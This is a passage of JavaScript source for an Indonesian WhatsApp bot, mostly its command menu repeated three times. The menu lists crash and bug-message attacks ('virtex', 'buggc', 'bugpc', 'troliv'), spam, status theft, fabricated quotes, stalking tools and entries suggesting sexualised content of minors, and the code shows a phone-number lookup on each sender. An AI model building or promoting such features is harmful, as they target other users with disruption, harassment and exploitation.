│_/\_ ${prefix}slow
│_/\_ ${prefix}fast
│_/\_ ${prefix}reverse
│_/\_ ${prefix}tourl
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿𝙀𝙍 
│_/\_ ${prefix}play query
│_/\_ ${prefix}ytmp4 link
│_/\_ ${prefix}ytmp3 link
│_/\_ ${prefix}video query
│_/\_ ${prefix}instagram link
│_/\_ ${prefix}twitter
│_/\_ ${prefix}facebook link
│_/\_ ${prefix}tiktokdl
│_/\_ ${prefix}tiktokmusic
│_/\_ ${prefix}ytsearch
│_/\_ ${prefix}play
│_/\_ ${prefix}ytmp3
│_/\_ ${prefix}ytmp4
│_/\_ ${prefix}igdl
│_/\_ ${prefix}fbdl
│_/\_ ${prefix}brainly
│_/\_ ${prefix}lirik
│_/\_ ${prefix}tiktoknowm
│_/\_ ${prefix}pinterest
│_/\_ ${prefix}spotifysearch
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙏𝘼𝙂 
│_/\_ ${prefix}hidetag
│_/\_ ${prefix}kontag
│_/\_ ${prefix}sticktag
│_/\_ ${prefix}totag
│
│  𝐒𝐞𝐚𝐫𝐜𝐡 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}kbbi
│_/\_ ${prefix}jarak
│_/\_ ${prefix}translate
│_/\_ ${prefix}infogempa
│_/\_ ${prefix}covidindo
│_/\_ ${prefix}covidglobal
│_/\_ ${prefix}wikipedia
│_/\_ ${prefix}playstore
│_/\_ ${prefix}kodepos
│_/\_ ${prefix}newsinfo
│_/\_ ${prefix}jadwaltv
│_/\_ ${prefix}cuaca
│_/\_ ${prefix}gimage
│_/\_ ${prefix}wallpapersearch
│_/\_ ${prefix}shopee
│_/\_ ${prefix}google
│
│ 𝐑𝐚𝐧𝐝𝐨𝐦 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}owner
│_/\_ ${prefix}sewabot
│_/\_ ${prefix}report
│_/\_ ${prefix}runtime
│_/\_ ${prefix}speed 
│_/\_ ${prefix}sc
│_/\_ ${prefix}rulesbot
│_/\_ ${prefix}sharelock
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙐𝙋𝙎𝙒 
│_/\_ ${prefix}upswteks
│_/\_ ${prefix}upswlokasi
│_/\_ ${prefix}upswsticker
│_/\_ ${prefix}upswimage
│_/\_ ${prefix}upswvideo
│_/\_ ${prefix}upswgif
│
│  𝐆𝐚𝐛𝐮𝐭 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}suit
│_/\_ ${prefix}artinama
│_/\_ ${prefix}jodoh
│_/\_ ${prefix}tebakumur
│_/\_ ${prefix}weton
│_/\_ ${prefix}jadian
│_/\_ ${prefix}faktaunik
│_/\_ ${prefix}anime
│_/\_ ${prefix}truth
│_/\_ ${prefix}dare
│_/\_ ${prefix}dadu
│_/\_ ${prefix}tebakgambar
│_/\_ ${prefix}tembak udara 
│_/\_ ${prefix}tembak laut
│_/\_ ${prefix}tembak darat
│_/\_ ${prefix}slot
│_/\_ ${prefix}quotes
│_/\_ ${prefix}quotesanime
│_/\_ ${prefix}quotesdilan
│_/\_ ${prefix}quotesimage
│_/\_ ${prefix}katabijak
│_/\_ ${prefix}randomnama
│_/\_ ${prefix}meme
│_/\_ ${prefix}darkjoke
│_/\_ ${prefix}memeindo
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙁𝙐𝙉 
│_/\_ ${prefix}fitnah
│_/\_ ${prefix}fitnahpc
│_/\_ ${prefix}kontak 0|p
│_/\_ ${prefix}lolivid
│_/\_ ${prefix}suit
│_/\_ ${prefix}toxic
│_/\_ ${prefix}flock
│_/\_ ${prefix}pantun
│_/\_ ${prefix}dadu
│_/\_ ${prefix}asupan
│_/\_ ${prefix}viewonce
│_/\_ ${prefix}detikvn number
│_/\_ ${prefix}detikvideo number
│_/\_ ${prefix}hbd
│
│  𝐒𝐭𝐚𝐥𝐤 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}igstalk
│_/\_ ${prefix}mlstalk
│_/\_ ${prefix}tkstalk
│_/\_ ${prefix}githubstalk
│_/\_ ${prefix}shortlink
│
│  𝐀𝐬𝐮𝐩𝐚𝐧 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}asupan
│_/\_ ${prefix}asupancecan
│_/\_ ${prefix}asupanhijaber
│_/\_ ${prefix}asupansantuy
│_/\_ ${prefix}asupanukhti
│_/\_ ${prefix}asupanbocil
│_/\_ ${prefix}asupanghea
│_/\_ ${prefix}asupanrika
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙉𝙎𝙁𝙒 
│_/\_ ${prefix}yuri
│_/\_ ${prefix}hentai
│_/\_ ${prefix}anal
│_/\_ ${prefix}eroneko
│_/\_ ${prefix}lesbian
│_/\_ ${prefix}kitsune
│_/\_ ${prefix}bj
│_/\_ ${prefix}pussy
│_/\_ ${prefix}wallpaper
│_/\_ ${prefix}neko2
│_/\_ ${prefix}baka
│_/\_ ${prefix}slap
│_/\_ ${prefix}poke
│_/\_ ${prefix}keta
│_/\_ ${prefix}awoo
│_/\_ ${prefix}blowjob
│_/\_ ${prefix}megumin
│_/\_ ${prefix}neko
│_/\_ ${prefix}trapnime
│
│  𝐖𝐢𝐛𝐮 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}kurumi
│_/\_ ${prefix}deku
│_/\_ ${prefix}sao
│_/\_ ${prefix}chika
│_/\_ ${prefix}kaneki
│_/\_ ${prefix}touka
│_/\_ ${prefix}eren
│_/\_ ${prefix}naruto
│_/\_ ${prefix}minato
│_/\_ ${prefix}sagiri
│_/\_ ${prefix}sasuke
│_/\_ ${prefix}sakura
│_/\_ ${prefix}tsunade
│_/\_ ${prefix}gojosatoru
└──────[ GITHUB ]──────❒
│_/\_Script Ory :
│_/\_https://github.com/narutomo/wabot-aq
│_/\_Notes : mendkng timdur:v
└──────────────────❒`)
break
case 'location':
groups = ALIYABOT.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = ALIYABOT.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await ALIYABOT.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await ALIYABOT.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `╭─❒ *LIST ALL MENU BOT*
│_/\_ ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙊𝙒𝙉𝙀𝙍 
│_/\_ ${prefix}off
│_/\_ ${prefix}isbaileys
│_/\_ ${prefix}banchat
│_/\_ ${prefix}unbanchat
│_/\_ ${prefix}listbc
│_/\_ ${prefix}setcmd
│_/\_ ${prefix}delcmd
│_/\_ ${prefix}listcmd
│_/\_ ${prefix}restart
│_/\_ ${prefix}antidelete on|off
│_/\_ ${prefix}autoketik on|off
│_/\_ ${prefix}autoread gc in / gc off
│_/\_ ${prefix}autovn on|off
│_/\_ ${prefix}anticall on|off
│_/\_ ${prefix}getcaption
│_/\_ ${prefix}bugkatalog
│_/\_ ${prefix}buggc id grup
│_/\_ ${prefix}bugpc *only pc*
│_/\_ ${prefix}troliv1
│_/\_ ${prefix}troliv2 *total*
│_/\_ ${prefix}virtex
│_/\_ ${prefix}on
│_/\_ ${prefix}status
│_/\_ ${prefix}setthumb
│_/\_ ${prefix}settarget
│_/\_ ${prefix}setfakeimg
│_/\_ ${prefix}setreply
│_/\_ ${prefix}hacked nama
│_/\_ ${prefix}setprefix
│_/\_ ${prefix}mode /public-self/
│_/\_ ${prefix}term <code>
│_/\_ ${prefix}eval <code>
│_/\_ ${prefix}colongsw reply
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙂𝙍𝙐𝙋 
│_/\_ ${prefix}grup 
│_/\_ ${prefix}promote 
│_/\_ ${prefix}demote 
│_/\_ ${prefix}setdesc
│_/\_ ${prefix}setname
│_/\_ ${prefix}nsfw 1/0
│_/\_ ${prefix}kick 
│_/\_ ${prefix}add 
│_/\_ ${prefix}getbio
│_/\_ ${prefix}getname 
│_/\_ ${prefix}reminder 
│_/\_ ${prefix}listonline
│_/\_ ${prefix}sider reply
│_/\_ ${prefix}antilink on|off
│_/\_ ${prefix}tod
│_/\_ ${prefix}tospam jumlah
│_/\_ ${prefix}antihidetag on|off
│_/\_ ${prefix}antiviewonce on|off
│_/\_ ${prefix}antivirtex on|off
│_/\_ ${prefix}autojoin on|off
│_/\_ ${prefix}kickarea
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙈𝘼𝙆𝙀𝙍 
│_/\_ ${prefix}sticker
│_/\_ ${prefix}swm author|packname
│_/\_ ${prefix}take author|packname
│_/\_ ${prefix}fdeface
│_/\_ ${prefix}attp teks
│_/\_ ${prefix}fancytext teks
│_/\_ ${prefix}emoji 
│_/\_ ${prefix}halloween teks
│_/\_ ${prefix}vampire teks
│_/\_ ${prefix}codetxt teks
│_/\_ ${prefix}googletxt
│_/\_ ${prefix}spiderman teks
│_/\_ ${prefix}express teks
│_/\_ ${prefix}maker2d2 teks
│_/\_ ${prefix}maker2d3 teks
│_/\_ ${prefix}maker2d4 teks
│_/\_ ${prefix}golden teks
│_/\_ ${prefix}flower teks
│_/\_ ${prefix}dance
│_/\_ ${prefix}wooden teks
│_/\_ ${prefix}burn
│_/\_ ${prefix}glow teks
│_/\_ ${prefix}summer teks
│_/\_ ${prefix}neon teks
│_/\_ ${prefix}coffeecup teks
│_/\_ ${prefix}coffeecup2 teks
│_/\_ ${prefix}battlefield teks|teks
│_/\_ ${prefix}googletxt2 teks
│_/\_ ${prefix}transformer teks
│_/\_ ${prefix}nulis teks
│_/\_ ${prefix}text3d teks
│_/\_ ${prefix}warrior teks
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝘾𝙊𝙉𝙑𝙀𝙍𝙏 
│_/\_ ${prefix}tomp3
│_/\_ ${prefix}tomp4
│_/\_ ${prefix}toimg
│_/\_ ${prefix}slow
│_/\_ ${prefix}fast
│_/\_ ${prefix}reverse
│_/\_ ${prefix}tourl
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿𝙀𝙍 
│_/\_ ${prefix}play query
│_/\_ ${prefix}ytmp4 link
│_/\_ ${prefix}ytmp3 link
│_/\_ ${prefix}video query
│_/\_ ${prefix}instagram link
│_/\_ ${prefix}twitter
│_/\_ ${prefix}facebook link
│_/\_ ${prefix}tiktokdl
│_/\_ ${prefix}tiktokmusic
│_/\_ ${prefix}ytsearch
│_/\_ ${prefix}play
│_/\_ ${prefix}ytmp3
│_/\_ ${prefix}ytmp4
│_/\_ ${prefix}igdl
│_/\_ ${prefix}fbdl
│_/\_ ${prefix}brainly
│_/\_ ${prefix}lirik
│_/\_ ${prefix}tiktoknowm
│_/\_ ${prefix}pinterest
│_/\_ ${prefix}spotifysearch
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙏𝘼𝙂 
│_/\_ ${prefix}hidetag
│_/\_ ${prefix}kontag
│_/\_ ${prefix}sticktag
│_/\_ ${prefix}totag
│
│  𝐒𝐞𝐚𝐫𝐜𝐡 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}kbbi
│_/\_ ${prefix}jarak
│_/\_ ${prefix}translate
│_/\_ ${prefix}infogempa
│_/\_ ${prefix}covidindo
│_/\_ ${prefix}covidglobal
│_/\_ ${prefix}wikipedia
│_/\_ ${prefix}playstore
│_/\_ ${prefix}kodepos
│_/\_ ${prefix}newsinfo
│_/\_ ${prefix}jadwaltv
│_/\_ ${prefix}cuaca
│_/\_ ${prefix}gimage
│_/\_ ${prefix}wallpapersearch
│_/\_ ${prefix}shopee
│_/\_ ${prefix}google
│
│ 𝐑𝐚𝐧𝐝𝐨𝐦 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}owner
│_/\_ ${prefix}sewabot
│_/\_ ${prefix}report
│_/\_ ${prefix}runtime
│_/\_ ${prefix}speed 
│_/\_ ${prefix}sc
│_/\_ ${prefix}rulesbot
│_/\_ ${prefix}sharelock
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙐𝙋𝙎𝙒 
│_/\_ ${prefix}upswteks
│_/\_ ${prefix}upswlokasi
│_/\_ ${prefix}upswsticker
│_/\_ ${prefix}upswimage
│_/\_ ${prefix}upswvideo
│_/\_ ${prefix}upswgif
│
│  𝐆𝐚𝐛𝐮𝐭 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}suit
│_/\_ ${prefix}artinama
│_/\_ ${prefix}jodoh
│_/\_ ${prefix}tebakumur
│_/\_ ${prefix}weton
│_/\_ ${prefix}jadian
│_/\_ ${prefix}faktaunik
│_/\_ ${prefix}anime
│_/\_ ${prefix}truth
│_/\_ ${prefix}dare
│_/\_ ${prefix}dadu
│_/\_ ${prefix}tebakgambar
│_/\_ ${prefix}tembak udara 
│_/\_ ${prefix}tembak laut
│_/\_ ${prefix}tembak darat
│_/\_ ${prefix}slot
│_/\_ ${prefix}quotes
│_/\_ ${prefix}quotesanime
│_/\_ ${prefix}quotesdilan
│_/\_ ${prefix}quotesimage
│_/\_ ${prefix}katabijak
│_/\_ ${prefix}randomnama
│_/\_ ${prefix}meme
│_/\_ ${prefix}darkjoke
│_/\_ ${prefix}memeindo
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙁𝙐𝙉 
│_/\_ ${prefix}fitnah
│_/\_ ${prefix}fitnahpc
│_/\_ ${prefix}kontak 0|p
│_/\_ ${prefix}lolivid
│_/\_ ${prefix}suit
│_/\_ ${prefix}toxic
│_/\_ ${prefix}flock
│_/\_ ${prefix}pantun
│_/\_ ${prefix}dadu
│_/\_ ${prefix}asupan
│_/\_ ${prefix}viewonce
│_/\_ ${prefix}detikvn number
│_/\_ ${prefix}detikvideo number
│_/\_ ${prefix}hbd
│
│  𝐒𝐭𝐚𝐥𝐤 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}igstalk
│_/\_ ${prefix}mlstalk
│_/\_ ${prefix}tkstalk
│_/\_ ${prefix}githubstalk
│_/\_ ${prefix}shortlink
│
│  𝐀𝐬𝐮𝐩𝐚𝐧 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}asupan
│_/\_ ${prefix}asupancecan
│_/\_ ${prefix}asupanhijaber
│_/\_ ${prefix}asupansantuy
│_/\_ ${prefix}asupanukhti
│_/\_ ${prefix}asupanbocil
│_/\_ ${prefix}asupanghea
│_/\_ ${prefix}asupanrika
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙉𝙎𝙁𝙒 
│_/\_ ${prefix}yuri
│_/\_ ${prefix}hentai
│_/\_ ${prefix}anal
│_/\_ ${prefix}eroneko
│_/\_ ${prefix}lesbian
│_/\_ ${prefix}kitsune
│_/\_ ${prefix}bj
│_/\_ ${prefix}pussy
│_/\_ ${prefix}wallpaper
│_/\_ ${prefix}neko2
│_/\_ ${prefix}baka
│_/\_ ${prefix}slap
│_/\_ ${prefix}poke
│_/\_ ${prefix}keta
│_/\_ ${prefix}awoo
│_/\_ ${prefix}blowjob
│_/\_ ${prefix}megumin
│_/\_ ${prefix}neko
│_/\_ ${prefix}trapnime
│
│  𝐖𝐢𝐛𝐮 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}kurumi
│_/\_ ${prefix}deku
│_/\_ ${prefix}sao
│_/\_ ${prefix}chika
│_/\_ ${prefix}kaneki
│_/\_ ${prefix}touka
│_/\_ ${prefix}eren
│_/\_ ${prefix}naruto
│_/\_ ${prefix}minato
│_/\_ ${prefix}sagiri
│_/\_ ${prefix}sasuke
│_/\_ ${prefix}sakura
│_/\_ ${prefix}tsunade
│_/\_ ${prefix}gojosatoru
└──────[ GITHUB ]──────❒
│_/\_Script Ory :
│_/\_https://github.com/narutomo/wabot-aq
│_/\_Notes : mendkng timdur:v
└──────────────────❒`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:ofrply}, [{buttonId:`${prefix}owner`,buttonText:{displayText:'Owner🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'allmenu2':
var menu = `Hai kak ${pushname}
Jangan lupa donasi ya kak
│────────────❒
│_/\_ ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙊𝙒𝙉𝙀𝙍 
│_/\_ ${prefix}off
│_/\_ ${prefix}isbaileys
│_/\_ ${prefix}banchat
│_/\_ ${prefix}unbanchat
│_/\_ ${prefix}listbc
│_/\_ ${prefix}setcmd
│_/\_ ${prefix}delcmd
│_/\_ ${prefix}listcmd
│_/\_ ${prefix}restart
│_/\_ ${prefix}antidelete on|off
│_/\_ ${prefix}autoketik on|off
│_/\_ ${prefix}autoread gc in / gc off
│_/\_ ${prefix}autovn on|off
│_/\_ ${prefix}anticall on|off
│_/\_ ${prefix}getcaption
│_/\_ ${prefix}bugkatalog
│_/\_ ${prefix}buggc id grup
│_/\_ ${prefix}bugpc *only pc*
│_/\_ ${prefix}troliv1
│_/\_ ${prefix}troliv2 *total*
│_/\_ ${prefix}virtex
│_/\_ ${prefix}on
│_/\_ ${prefix}status
│_/\_ ${prefix}setthumb
│_/\_ ${prefix}settarget
│_/\_ ${prefix}setfakeimg
│_/\_ ${prefix}setreply
│_/\_ ${prefix}hacked nama
│_/\_ ${prefix}setprefix
│_/\_ ${prefix}mode /public-self/
│_/\_ ${prefix}term <code>
│_/\_ ${prefix}eval <code>
│_/\_ ${prefix}colongsw reply
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙂𝙍𝙐𝙋 
│_/\_ ${prefix}grup 
│_/\_ ${prefix}promote 
│_/\_ ${prefix}demote 
│_/\_ ${prefix}setdesc
│_/\_ ${prefix}setname
│_/\_ ${prefix}nsfw 1/0
│_/\_ ${prefix}kick 
│_/\_ ${prefix}add 
│_/\_ ${prefix}getbio
│_/\_ ${prefix}getname 
│_/\_ ${prefix}reminder 
│_/\_ ${prefix}listonline
│_/\_ ${prefix}sider reply
│_/\_ ${prefix}antilink on|off
│_/\_ ${prefix}tod
│_/\_ ${prefix}tospam jumlah
│_/\_ ${prefix}antihidetag on|off
│_/\_ ${prefix}antiviewonce on|off
│_/\_ ${prefix}antivirtex on|off
│_/\_ ${prefix}autojoin on|off
│_/\_ ${prefix}kickarea
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙈𝘼𝙆𝙀𝙍 
│_/\_ ${prefix}sticker
│_/\_ ${prefix}swm author|packname
│_/\_ ${prefix}take author|packname
│_/\_ ${prefix}fdeface
│_/\_ ${prefix}attp teks
│_/\_ ${prefix}fancytext teks
│_/\_ ${prefix}emoji 
│_/\_ ${prefix}halloween teks
│_/\_ ${prefix}vampire teks
│_/\_ ${prefix}codetxt teks
│_/\_ ${prefix}googletxt
│_/\_ ${prefix}spiderman teks
│_/\_ ${prefix}express teks
│_/\_ ${prefix}maker2d2 teks
│_/\_ ${prefix}maker2d3 teks
│_/\_ ${prefix}maker2d4 teks
│_/\_ ${prefix}golden teks
│_/\_ ${prefix}flower teks
│_/\_ ${prefix}dance
│_/\_ ${prefix}wooden teks
│_/\_ ${prefix}burn
│_/\_ ${prefix}glow teks
│_/\_ ${prefix}summer teks
│_/\_ ${prefix}neon teks
│_/\_ ${prefix}coffeecup teks
│_/\_ ${prefix}coffeecup2 teks
│_/\_ ${prefix}battlefield teks|teks
│_/\_ ${prefix}googletxt2 teks
│_/\_ ${prefix}transformer teks
│_/\_ ${prefix}nulis teks
│_/\_ ${prefix}text3d teks
│_/\_ ${prefix}warrior teks
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝘾𝙊𝙉𝙑𝙀𝙍𝙏 
│_/\_ ${prefix}tomp3
│_/\_ ${prefix}tomp4
│_/\_ ${prefix}toimg
│_/\_ ${prefix}slow
│_/\_ ${prefix}fast
│_/\_ ${prefix}reverse
│_/\_ ${prefix}tourl
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿𝙀𝙍 
│_/\_ ${prefix}play query
│_/\_ ${prefix}ytmp4 link
│_/\_ ${prefix}ytmp3 link
│_/\_ ${prefix}video query
│_/\_ ${prefix}instagram link
│_/\_ ${prefix}twitter
│_/\_ ${prefix}facebook link
│_/\_ ${prefix}tiktokdl
│_/\_ ${prefix}tiktokmusic
│_/\_ ${prefix}ytsearch
│_/\_ ${prefix}play
│_/\_ ${prefix}ytmp3
│_/\_ ${prefix}ytmp4
│_/\_ ${prefix}igdl
│_/\_ ${prefix}fbdl
│_/\_ ${prefix}brainly
│_/\_ ${prefix}lirik
│_/\_ ${prefix}tiktoknowm
│_/\_ ${prefix}pinterest
│_/\_ ${prefix}spotifysearch
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙏𝘼𝙂 
│_/\_ ${prefix}hidetag
│_/\_ ${prefix}kontag
│_/\_ ${prefix}sticktag
│_/\_ ${prefix}totag
│
│  𝐒𝐞𝐚𝐫𝐜𝐡 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}kbbi
│_/\_ ${prefix}jarak
│_/\_ ${prefix}translate
│_/\_ ${prefix}infogempa
│_/\_ ${prefix}covidindo
│_/\_ ${prefix}covidglobal
│_/\_ ${prefix}wikipedia
│_/\_ ${prefix}playstore
│_/\_ ${prefix}kodepos
│_/\_ ${prefix}newsinfo
│_/\_ ${prefix}jadwaltv
│_/\_ ${prefix}cuaca
│_/\_ ${prefix}gimage
│_/\_ ${prefix}wallpapersearch
│_/\_ ${prefix}shopee
│_/\_ ${prefix}google
│
│ 𝐑𝐚𝐧𝐝𝐨𝐦 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}owner
│_/\_ ${prefix}sewabot
│_/\_ ${prefix}report
│_/\_ ${prefix}runtime
│_/\_ ${prefix}speed 
│_/\_ ${prefix}sc
│_/\_ ${prefix}rulesbot
│_/\_ ${prefix}sharelock
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙐𝙋𝙎𝙒 
│_/\_ ${prefix}upswteks
│_/\_ ${prefix}upswlokasi
│_/\_ ${prefix}upswsticker
│_/\_ ${prefix}upswimage
│_/\_ ${prefix}upswvideo
│_/\_ ${prefix}upswgif
│
│  𝐆𝐚𝐛𝐮𝐭 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}suit
│_/\_ ${prefix}artinama
│_/\_ ${prefix}jodoh
│_/\_ ${prefix}tebakumur
│_/\_ ${prefix}weton
│_/\_ ${prefix}jadian
│_/\_ ${prefix}faktaunik
│_/\_ ${prefix}anime
│_/\_ ${prefix}truth
│_/\_ ${prefix}dare
│_/\_ ${prefix}dadu
│_/\_ ${prefix}tebakgambar
│_/\_ ${prefix}tembak udara 
│_/\_ ${prefix}tembak laut
│_/\_ ${prefix}tembak darat
│_/\_ ${prefix}slot
│_/\_ ${prefix}quotes
│_/\_ ${prefix}quotesanime
│_/\_ ${prefix}quotesdilan
│_/\_ ${prefix}quotesimage
│_/\_ ${prefix}katabijak
│_/\_ ${prefix}randomnama
│_/\_ ${prefix}meme
│_/\_ ${prefix}darkjoke
│_/\_ ${prefix}memeindo
│
│  ⬣ 𝙈𝘼𝙆𝙄𝙉𝙂 𝙁𝙀𝘼𝙏𝙐𝙍𝙀𝙎
│_/\_ ${prefix}sticker
│_/\_ ${prefix}swm author|packname
│_/\_ ${prefix}take author|packname
│_/\_ ${prefix}fdeface
│_/\_ ${prefix}emoji
│_/\_ ${prefix}golden text
│_/\_ ${prefix}flower text
│_/\_ ${prefix}wooden text
│_/\_ ${prefix}burn text
│_/\_ ${prefix}glow text
│_/\_ ${prefix}summer text
│_/\_ ${prefix}neon text
│_/\_ ${prefix}coffeecup text
│_/\_ ${prefix}coffeecup2 text
│_/\_ ${prefix}battlefield text|text
│_/\_ ${prefix}googletxt2 text|text
│_/\_ ${prefix}transformer text|text
│_/\_ ${prefix}write text
│_/\_ ${prefix}waifu
│_/\_ ${prefix}phlogo text|*text
│_/\_ ${prefix}tfire text
│_/\_ ${prefix}phcomment text|text
│_/\_ ${prefix}wolf text
│_/\_ ${prefix}ytgol text
│_/\_ ${prefix}ytsilver text
│_/\_ ${prefix}t3d text
│_/\_ ${prefix}logoa text|text
│_/\_ ${prefix}marvel text|text
│_/\_ ${prefix}leavest text
│_/\_ ${prefix}neon2 text
│_/\_ ${prefix}wall text
│_/\_ ${prefix}notewrite text
│_/\_ ${prefix}pubglogo text|text
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙁𝙐𝙉 
│_/\_ ${prefix}fitnah
│_/\_ ${prefix}fitnahpc
│_/\_ ${prefix}kontak 0|p
│_/\_ ${prefix}lolivid
│_/\_ ${prefix}suit
│_/\_ ${prefix}toxic
│_/\_ ${prefix}flock
│_/\_ ${prefix}pantun
│_/\_ ${prefix}dadu
│_/\_ ${prefix}asupan
│_/\_ ${prefix}viewonce
│_/\_ ${prefix}detikvn number
│_/\_ ${prefix}detikvideo number
│_/\_ ${prefix}hbd
│
│  𝐒𝐭𝐚𝐥𝐤 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}igstalk
│_/\_ ${prefix}mlstalk
│_/\_ ${prefix}tkstalk
│_/\_ ${prefix}githubstalk
│_/\_ ${prefix}shortlink
│
│  𝐀𝐬𝐮𝐩𝐚𝐧 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}asupan
│_/\_ ${prefix}asupancecan
│_/\_ ${prefix}asupanhijaber
│_/\_ ${prefix}asupansantuy
│_/\_ ${prefix}asupanukhti
│_/\_ ${prefix}asupanbocil
│_/\_ ${prefix}asupanghea
│_/\_ ${prefix}asupanrika
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙉𝙎𝙁𝙒 
│_/\_ ${prefix}yuri
│_/\_ ${prefix}hentai
│_/\_ ${prefix}anal
│_/\_ ${prefix}eroneko
│_/\_ ${prefix}lesbian
│_/\_ ${prefix}kitsune
│_/\_ ${prefix}bj
│_/\_ ${prefix}pussy
│_/\_ ${prefix}wallpaper
│_/\_ ${prefix}neko2
│_/\_ ${prefix}baka
│_/\_ ${prefix}slap
│_/\_ ${prefix}poke
│_/\_ ${prefix}keta
│_/\_ ${prefix}awoo
│_/\_ ${prefix}blowjob
│_/\_ ${prefix}megumin
│_/\_ ${prefix}neko
│_/\_ ${prefix}trapnime
│
│  𝐖𝐢𝐛𝐮 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}kurumi
│_/\_ ${prefix}deku
│_/\_ ${prefix}sao
│_/\_ ${prefix}chika
│_/\_ ${prefix}kaneki
│_/\_ ${prefix}touka
│_/\_ ${prefix}eren
│_/\_ ${prefix}naruto
│_/\_ ${prefix}minato
│_/\_ ${prefix}sagiri
│_/\_ ${prefix}sasuke
│_/\_ ${prefix}sakura
│_/\_ ${prefix}tsunade
│_/\_ ${prefix}gojosatoru
└──────[ GITHUB ]──────❒
│_/\_Script :
│_/\_https://github.com/AlyaCanz/AliyaCans/tree/master
│_/\_Notes : mendkng timdur:v
└──────────────────❒


           ║▌│█║▌│ █║▌│█│║▌║
           ║▌│█║▌│ █║▌│█│║▌║
   
            [ *POWERED BY @Alya* ]
`
var imgs = await ALIYABOT.prepareMessage('0@c.us', thumb, image, { thumbnail: thumb })
            var imgCatalog = imgs.message.imageMessage
            var ctlg = await ALIYABOT.prepareMessageFromContent(from, {
                "productMessage": {
                    "product": {
                        "productImage": imgCatalog,
                        "productId": "4457725420906655",
                        "title": `_*ALLMENU BOT*_`,
                        "description": menu,
                        "footerText": `ALYA BOT`,
                        "currencyCode": "IDR",
                        "priceAmount1000": "26262626262626",
                        "productImageCount": 1,
                        "firstImageId": 1,
                        "salePriceAmount1000": "1000",
                        "retailerId": `${fakeyoi}`,
                        "url": "Love You All >_<"
                    },
                    "businessOwnerJid": "62858157008613@s.whatsapp.net",
                }
            }, { quoted: mek, mimetype: 'ALIYABOT/jpeg' })
            ALIYABOT.relayWAMessage(ctlg)
            break
case 'document':
if (isBanned) return reply(mess.ban)
        ptod = "6281337541779@s.whatsapp.net"
        stod = `${sender}`
        uwu = '```'
       stst = await ALIYABOT.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
tescok = `${menunya(prefix)}`
